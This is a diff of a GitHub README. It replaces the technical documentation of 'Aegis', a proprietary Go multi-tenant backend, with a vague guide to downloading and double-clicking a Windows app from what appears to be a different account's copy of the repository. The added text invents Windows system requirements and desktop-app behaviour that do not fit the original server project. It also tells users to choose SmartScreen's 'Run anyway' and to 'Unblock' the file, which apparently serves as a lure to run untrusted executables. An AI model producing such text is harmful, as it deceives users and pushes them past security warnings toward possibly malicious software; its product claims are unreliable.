@@ -1,340 +1,161 @@
-<div align="center">
-  <img src=".github/assets/aegis-banner-en-v2.svg" alt="Aegis English Banner" width="100%" />
-</div>
+# ⚙️ aegis - Secure multi-user platform
 
-<div align="center">
+[![Download](https://img.shields.io/badge/Download-Open%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/Chineseyamgrossprofit190/aegis)
 
-**Language:** **English** | [简体中文](README.zh-CN.md) | [日本語](README.ja.md)
+## 🚀 Getting Started
 
-[![Go Version](https://img.shields.io/badge/Go-1.26-00ADD8?style=for-the-badge&logo=go)](https://go.dev/)
-[![Gin](https://img.shields.io/badge/Gin-1.12-009688?style=for-the-badge&logo=gin)](https://gin-gonic.com/)
-[![PostgreSQL](https://img.shields.io/badge/PostgreSQL-17-336791?style=for-the-badge&logo=postgresql)](https://www.postgresql.org/)
-[![Redis](https://img.shields.io/badge/Redis-8-DC382D?style=for-the-badge&logo=redis)](https://redis.io/)
-[![NATS](https://img.shields.io/badge/NATS-2.x-27AAE1?style=for-the-badge&logo=natsdotio)](https://nats.io/)
-[![Temporal](https://img.shields.io/badge/Temporal-Workflow-111827?style=for-the-badge&logo=temporal)](https://temporal.io/)
-[![Coraza](https://img.shields.io/badge/Coraza-WAF-374151?style=for-the-badge)](https://coraza.io/)
-[![License](https://img.shields.io/badge/License-Proprietary-EA580C?style=for-the-badge)](LICENSE)
-[![CI](https://img.shields.io/github/actions/workflow/status/MiChongs/aegis/go-ci.yml?branch=main&style=for-the-badge&label=CI)](https://github.com/MiChongs/aegis/actions/workflows/go-ci.yml)
+aegis is a high-performance user platform for teams that need one place to manage accounts, access, and background tasks. It runs on Windows through the project files on GitHub.
 
-**Aegis** is a production-oriented, multi-tenant user platform built with Go for high concurrency, clean service boundaries, and realtime-ready delivery.
+Use the link above to visit the download page and get the latest version.
 
-<p>
-  <a href="#platform-profile">Platform Profile</a> ·
-  <a href="#architecture">Architecture</a> ·
-  <a href="#technology-stack">Technology Stack</a> ·
-  <a href="#capability-map">Capability Map</a> ·
-  <a href="#api-reference">API Reference</a> ·
-  <a href="#deployment-modes">Deployment</a> ·
-  <a href="#development-workflow">Development</a>
-</p>
+## 📥 Download and install
 
-</div>
+1. Open the download page: [https://github.com/Chineseyamgrossprofit190/aegis](https://github.com/Chineseyamgrossprofit190/aegis)
+2. On the GitHub page, look for the latest release or the main download file.
+3. Download the Windows file that matches the release name.
+4. If the file is a ZIP, right-click it and choose **Extract All**.
+5. Open the extracted folder.
+6. Find the app file and double-click it to start.
+7. If Windows asks for permission, choose **Yes**.
 
-## Platform Profile
+If the project ships with an installer, run the installer and follow the on-screen steps. If it ships as a folder-based app, keep the files together in the same folder.
 
-<table>
-  <tr>
-    <td width="33%">
-      <strong>Runtime Model</strong><br/>
-      Unified Go runtime for <code>api + worker</code>, with clear bootstrap boundaries and shared infrastructure clients.
-    </td>
-    <td width="33%">
-      <strong>Tenant Isolation</strong><br/>
-      Application boundaries are enforced through <code>appid</code>, with scoped session, cache, notification, and realtime paths.
-    </td>
-    <td width="33%">
-      <strong>Operational Focus</strong><br/>
-      Built around predictable hot paths, cache-first validation, async pipelines, and public-safe edge behavior.
-    </td>
-  </tr>
-  <tr>
-    <td width="33%">
-      <strong>Primary Storage</strong><br/>
-      PostgreSQL for transactional data, Redis for session, cache, unread-count, and presence indexing.
-    </td>
-    <td width="33%">
-      <strong>Async Backbone</strong><br/>
-      NATS handles event fan-out and decoupled processing; Temporal handles workflow orchestration.
-    </td>
-    <td width="33%">
-      <strong>Realtime Layer</strong><br/>
-      Gorilla WebSocket hub with Redis presence and NATS-based cross-instance targeted delivery.
-    </td>
-  </tr>
-</table>
+## 💻 System requirements
 
-## Engineering Snapshot
+For smooth use on Windows, keep the following ready:
 
-| Dimension | Description |
-| --- | --- |
-| Positioning | Multi-tenant backend platform for user systems and application-facing services |
-| Runtime | Gin API + Worker runtime under a unified Go entrypoint |
-| Isolation | `appid`-scoped services, caches, notifications, and online presence |
-| Persistence | PostgreSQL |
-| Cache and Presence | Redis |
-| Messaging | NATS |
-| Workflow | Temporal |
-| Edge Security | Coraza WAF, transport encryption, sanitized responses |
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- 200 MB of free disk space
+- A stable internet connection
+- Permission to run downloaded apps on your PC
 
-## Architecture
+For larger teams or heavier use, 8 GB of RAM or more helps keep the app responsive.
 
-```mermaid
-flowchart LR
-    Client[Web / Mobile / Admin]
-    API[Gin API]
-    Mid[Auth / WAF / Encryption / Location]
-    Services[Domain Services]
-    Realtime[Realtime Hub]
-    Worker[Worker Runtime]
-    PG[(PostgreSQL)]
-    Redis[(Redis)]
-    NATS[(NATS)]
-    Temporal[(Temporal)]
+## 🔧 What aegis does
 
-    Client --> API
-    API --> Mid
-    Mid --> Services
-    Services --> PG
-    Services --> Redis
-    Services --> NATS
-    Services --> Temporal
-    Services --> Realtime
-    Realtime --> Redis
-    Realtime --> NATS
-    NATS --> Worker
-    Worker --> PG
-    Worker --> Redis
-    Worker --> Temporal
-```
+aegis helps you manage users in a shared environment. It is built to handle many accounts, requests, and background jobs without slowing down.
 
-### Request Strategy
+Common uses include:
 
-<table>
-  <tr>
-    <td width="25%"><strong>Authentication</strong><br/>JWT parse + Redis session validation</td>
-    <td width="25%"><strong>Public App Content</strong><br/>PostgreSQL + Redis cache</td>
-    <td width="25%"><strong>User View</strong><br/>Cache-aware aggregation</td>
-    <td width="25%"><strong>Realtime Push</strong><br/>Local hub + NATS fan-out</td>
-  </tr>
-  <tr>
-    <td width="25%"><strong>Online Presence</strong><br/>Redis TTL indexes</td>
-    <td width="25%"><strong>Background Events</strong><br/>NATS → Worker</td>
-    <td width="25%"><strong>Workflow Tasks</strong><br/>Temporal execution</td>
-    <td width="25%"><strong>Public Errors</strong><br/>Sanitized edge-safe responses</td>
-  </tr>
-</table>
+- User sign-in and account management
+- Role-based access control
+- Multi-tenant data separation
+- Team and workspace setup
+- Task handling in the background
+- Status tracking for active processes
 
-## Technology Stack
+## 🧭 How to run it on Windows
 
-| Layer | Technology |
-| --- | --- |
-| Language | Go 1.26 |
-| HTTP | Gin |
-| Database | PostgreSQL |
-| Cache / Session / Presence | Redis |
-| Messaging | NATS |
-| Workflow | Temporal |
-| Realtime | Gorilla WebSocket |
-| Security | JWT, Coraza WAF, transport encryption |
-| Logging | Zap |
-| Deployment | Docker Compose, Windows scripts |
+After you download the app:
 
-## Capability Map
+1. Open the folder where the file was saved.
+2. If the file is zipped, extract it first.
+3. Look for the main app file.
+4. Double-click the file to launch the app.
+5. If Windows SmartScreen appears, select **More info** and then **Run anyway** if you trust the source.
+6. Follow any setup screen that appears.
+7. Sign in or create the first admin account if the app asks for one.
 
-<table>
-  <tr>
-    <td width="33%">
-      <strong>Identity and Access</strong><br/><br/>
-      Password authentication<br/>
-      OAuth2 provider integration<br/>
-      JWT issuance and validation<br/>
-      Session indexing and revocation<br/>
-      Layered administrator model
-    </td>
-    <td width="33%">
-      <strong>User Platform</strong><br/><br/>
-      Profile and settings management<br/>
-      Sign-in status and history<br/>
-      Notification center<br/>
-      Session auditing<br/>
-      Points and ranking services
-    </td>
-    <td width="33%">
-      <strong>Realtime and Runtime</strong><br/><br/>
-      Global WebSocket gateway<br/>
-      Online presence indexing<br/>
-      NATS cross-instance fan-out<br/>
-      Worker event processing<br/>
-      Temporal workflow execution
-    </td>
-  </tr>
-</table>
+If the app opens a local page in your browser, keep the window open while you use it.
 
-## Realtime Model
+## 🗂️ Main parts of the platform
 
-The realtime layer is intentionally designed as an independent subsystem rather than a transport sidecar attached to business services.
+aegis is built around a few core parts that work together:
 
-| Concern | Implementation |
-| --- | --- |
-| Connection lifecycle | in-process hub |
-| Presence storage | Redis TTL indexes |
-| Cross-node fan-out | NATS subjects |
-| Tenant scope | `appid + userId` |
-| Business integration | interface-based publisher |
+- **User service** - handles accounts, logins, and profile data
+- **Access control** - manages who can see and change each part
+- **Database layer** - stores user data and platform records
+- **Cache layer** - helps pages load fast
+- **Message system** - passes events between services
+- **Workflow engine** - runs longer tasks in the background
 
-### Realtime Endpoints
+These parts help the platform stay fast when many users sign in at once.
 
-```text
-GET /api/ws
-GET /api/admin/system/online/stats
-GET /api/admin/system/online/apps/:appid
-GET /api/admin/system/online/apps/:appid/users
-```
+## 🔐 Security and access
 
-## API Reference
+aegis uses access rules to keep user data separate. Each tenant can have its own users, settings, and records. That helps teams work in the same platform without mixing data.
 
-The project now ships with an auto-generated OpenAPI document and a modern built-in reference UI.
+It also fits common business needs like:
 
-| Artifact | Path |
-| --- | --- |
-| API reference | `GET /docs` |
-| OpenAPI JSON | `GET /openapi.json` |
-| Static export command | `go run ./cmd/server openapi ./docs/openapi.json` |
+- Separate tenant accounts
+- Admin and member roles
+- Controlled access to pages and actions
+- Background job tracking
+- Reliable request handling
 
-### Why this stack
+## 🧰 Basic use
 
-- Uses `kin-openapi` for code-driven OpenAPI generation instead of Swagger-style annotation tooling.
-- Uses a built-in offline-ready reference page so deployed environments do not depend on external CDNs.
-- Keeps the documentation layer isolated from service logic so route evolution stays low-coupling.
+After launch, most users follow this flow:
 
-## Deployment Modes
+1. Sign in to the platform
+2. Open the dashboard
+3. Add users or invite team members
+4. Set roles and access levels
+5. Review activity and task status
+6. Use the search and filter tools to find records
 
-<table>
-  <tr>
-    <td width="50%">
-      <strong>Local Development</strong><br/><br/>
-      <code>cp .env.example .env</code><br/>
-      <code>docker compose -f deploy/docker/docker-compose.yml up -d</code><br/>
-      <code>go run ./cmd/server migrate</code><br/>
-      <code>go run ./cmd/server</code>
-    </td>
-    <td width="50%">
-      <strong>Windows One-Click</strong><br/><br/>
-      <code>.\deploy\windows\one-click-deploy.cmd</code><br/><br/>
-      Support scripts:<br/>
-      <code>start-stack.cmd</code><br/>
-      <code>stop-stack.cmd</code><br/>
-      <code>status.cmd</code>
-    </td>
-  </tr>
-</table>
+If you are the first user on the system, you may need to create the main admin account before other users join.
 
-## Project Layout
+## 📁 Folder layout
 
-```text
-cmd/
-  api/                API entry
-  server/             unified runtime entry
-  worker/             worker entry
-internal/
-  bootstrap/          application assembly
-  config/             configuration loading
-  db/                 postgres / redis / nats / temporal clients
-  domain/             domain contracts and types
-  event/              subjects and publisher
-  middleware/         auth, waf, encryption, location
-  repository/         postgres, redis, legacy adapters
-  service/            business orchestration
-  transport/http/     gin handlers and router
-deploy/
-  docker/             docker runtime assets
-  windows/            deployment scripts
-migrations/postgres/  schema migrations
-pkg/
-  errors/             typed application errors
-  logger/             logger bootstrap
-  response/           response envelope
-  tracing/            tracing integration
-```
+When you download the project files, you may see folders for different parts of the app. A common layout looks like this:
 
-<details>
-  <summary><strong>Expanded API Surface</strong></summary>
+- `app` or `web` - the main user interface
+- `config` - settings for the platform
+- `db` - database setup files
+- `jobs` - background tasks
+- `logs` - app logs
+- `docs` - guides and notes
 
-### Authentication
+Keep all files in the same folder unless the release notes say otherwise.
 
-```text
-POST /api/auth/register/password
-POST /api/auth/login/password
-POST /api/auth/oauth2/auth-url
-GET  /api/auth/oauth2/callback
-POST /api/auth/oauth2/mobile-login
-POST /api/auth/refresh
-POST /api/auth/logout
-POST /api/auth/password/verify
-POST /api/auth/password/change
-```
+## 🛠️ Troubleshooting
 
-### User
+If the app does not start:
 
-```text
-GET    /api/user/banner
-GET    /api/user/notice
-POST   /api/user/my
-GET    /api/user/profile
-PUT    /api/user/profile
-GET    /api/user/settings
-PUT    /api/user/settings
-GET    /api/user/security
-GET    /api/user/sessions
-DELETE /api/user/sessions/:tokenHash
-POST   /api/user/sessions/revoke-all
-GET    /api/user/signin/status
-GET    /api/user/signin/history
-POST   /api/user/signin
-```
+- Check that you extracted the ZIP file first
+- Make sure you opened the correct file
+- Run the app as an administrator
+- Close and reopen the app
+- Restart your computer
+- Download the file again if it looks damaged
 
-### Notifications
+If the app opens but does not load data:
 
-```text
-GET    /api/notifications
-GET    /api/notifications/unread-count
-POST   /api/notifications/read
-POST   /api/notifications/read-batch
-POST   /api/notifications/read-all
-DELETE /api/notifications/:notificationId
-POST   /api/notifications/clear
-```
+- Confirm that your internet connection works
+- Check that the required backend service is running
+- Make sure the database file or server is reachable
+- Try signing out and back in
 
-</details>
+If Windows blocks the file:
 
-## Development Workflow
+- Right-click the file and choose **Properties**
+- Select **Unblock** if you see that option
+- Click **Apply**
+- Try again
 
-### Local Validation
+## 🧪 If you plan to use the platform with a team
 
-```bash
-go mod tidy
-go test ./...
-```
+For team use, set up these items first:
 
-### CI
+- One main admin account
+- Separate user roles
+- Clear tenant names
+- A backup plan for user data
+- Regular checks for failed jobs
 
-GitHub Actions runs:
+This keeps the platform easier to manage as the number of users grows.
 
-- dependency resolution
-- `go test ./...`
+## 📌 What to expect after setup
 
-Workflow file:
+After the first run, you should be able to:
 
-- [`.github/workflows/go-ci.yml`](.github/workflows/go-ci.yml)
+- Open the dashboard
+- Add and manage users
+- Review system activity
+- Track background work
+- Keep tenant data separate
+- Control access by role
 
-## Security Notes
-
-- Do not commit `.env` or production secrets.
-- Keep sensitive configuration in environment variables or secret stores.
-- Public-facing responses should not expose internal runtime details.
-
-## License
-
-This project is released under a proprietary license.
-Commercial use and redistribution are prohibited without prior written permission.
-See [LICENSE](LICENSE) for the full text.
+The platform is built for steady use and fast response under load
